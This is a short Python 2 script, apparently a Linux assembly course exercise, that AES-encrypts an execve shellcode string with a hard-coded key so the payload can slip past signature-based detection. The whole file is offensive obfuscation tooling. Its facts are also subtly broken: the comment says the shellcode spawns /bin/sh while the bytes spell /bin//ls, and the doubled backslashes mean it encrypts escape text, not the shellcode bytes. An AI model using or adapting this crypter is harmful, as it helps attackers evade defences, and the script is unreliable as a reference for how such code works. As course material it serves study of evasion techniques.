#!/usr/bin/python

# Filename: AES_encryption.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to generate encrypted shellcode from the original shellcode
# Usage: python AES_encryption.py 

from Crypto.Cipher import AES
import sys
import os
import base64

def aes128(shc):

#block size = 16 byte arrays 
 BLOCK_SIZE = 16 
 PADDING = '{'
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))

#static encryption/decryption key - must be 16/24/32 bytes long
 secret = 'securitytubeSLAE' 
 cipher = AES.new(secret)
 encoded = EncodeAES(cipher, shc)
 print 'Encrypted shellcode (AES 128-bit key + base-64 encoded):\n\n', encoded

#execve-stack shellcode to spawn /bin/sh shell
shellcode = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x6c\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

SLAE = aes128 (shellcode)
